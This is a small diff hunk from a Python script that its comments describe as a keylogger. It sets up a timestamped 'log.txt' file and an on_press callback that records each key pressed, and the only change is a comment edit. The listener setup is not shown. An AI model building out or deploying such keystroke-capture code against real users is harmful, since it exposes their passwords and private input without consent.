@@ -4,7 +4,7 @@ import logging
 #basic configuration, format of the keylog file
 logging.basicConfig(filename=("log.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
 
-#function define
+#function
 def on_press(key):
     logging.info(str(key))
 
